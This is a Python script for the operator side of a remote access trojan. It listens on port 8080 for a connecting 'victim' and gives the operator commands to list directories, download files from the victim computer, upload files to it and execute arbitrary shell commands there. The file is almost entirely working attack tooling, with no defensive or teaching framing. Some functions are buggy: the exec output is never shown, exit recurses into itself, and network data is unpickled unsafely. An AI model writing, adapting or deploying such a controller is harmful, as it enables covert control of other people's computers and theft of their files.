import os
import socket
import pickle

s = socket.socket()
host = socket.gethostname()  #for localhost as attacker
port = 8080
s.bind((host, port)) #server-side binding

##### Establishing a Connection #####

print("")
print("[*] Waiting for connection @",host, "...")

s.listen(1)  #Listening for 1 client
conn, addr = s.accept()  #Wait to accept connection - blocking call

print("")
print("[*]", addr, "has been connected successfully")

##### Connection Has Been Completed #####

##### FUNCTIONS #####

def show_help():
    a = """
Commands:
---------
help --> Show this help menu
cwd --> show current working directory
list --> list current directory
exit --> Exit the session, connection will be lost permanently
pull --> Download files form victim computer
push --> Upload files to victim computer
exec --> Executes a shell command 

"""
    print(a)    


def get_cwd():
    command = 'cwd'
    conn.send(command.encode())
    output = conn.recv(500000)
    output = output.decode()
    return output

def list_cwd():
    conn.send(command.encode())
    output = conn.recv(5000)
    output = pickle.loads(output)

    for i in output:
        if os.path.isdir(i):
            print(" ",i,"[DIR]")
        else:
            print(" ",i)
    print("")
    
    
def exit():
    conn.send(command.encode())
    exit()
    
def custom_dir():

    conn.send(command.encode())
    name = input("Custom Directory: ")
    conn.send(name.encode())
    output = conn.recv(5000)
    output = pickle.loads(output)  #for decoding list
    print("")
    print(get_cwd())
    for i in output:
        if os.path.isdir(i):
            print(" ",i, "[DIR]")
        else:
            print(" ",i)
    print("")


# download files from remote computer
def pull_file():
    
    conn.send(command.encode())
    path = str(input("Path to the file: "))
    conn.send(path.encode())
    file = conn.recv(100000)
    filename = str(input("Output filename (eg. file.txt): "))

    newfile = open(filename, "wb")  #write as bytes
    newfile.write(file)
    newfile.close()

    print("")
    print("File has been downloaded Successfully")
    print("")

def push_file():
    conn.send(command.encode())
    local_path = str(input("Enter path to the local file: "))
    file = open(local_path, "rb")  #read as bytes
    data = file.read()
    file.close()

    print("Data sent successfully")

    remote_path = str(input("Path in remote Computer (e.g. D:/Docs/file.txt) : "))

    conn.send(remote_path.encode())
    conn.send(data)
    print("")
    print("File has been send successfully")
    
    

def execute():
    #prompt = str(get_cwd())+" >> "
    prompt = "Enter shell command to execute: "
    command = "exec"
    conn.send(command.encode())

    command = input(prompt)
    print("[*] Executing command in the victim's compueter...")
    conn.send(command.encode())
    output = conn.recv(50000)
    output = output.decode()


##### END OF FUNCTIONS #####

##### Command Handling #####

while 1:
    command = input(str("Command >> "))

    # Print Current Working Directory:
    if command == "cwd":
        print(get_cwd())

    elif command == "list":
        list_cwd()
        print("")
        
    elif command == "exec":
        execute()

    elif command == "help":
        show_help()

    elif command == "exit":
        exit()

    elif command == "custom_dir":
        custom_dir()

    elif command == "pull":
         pull_file()

    elif command == "push":
        push_file()
    
    else:
        print("")
        print("[*] Command not recognized")
        show_help()
    


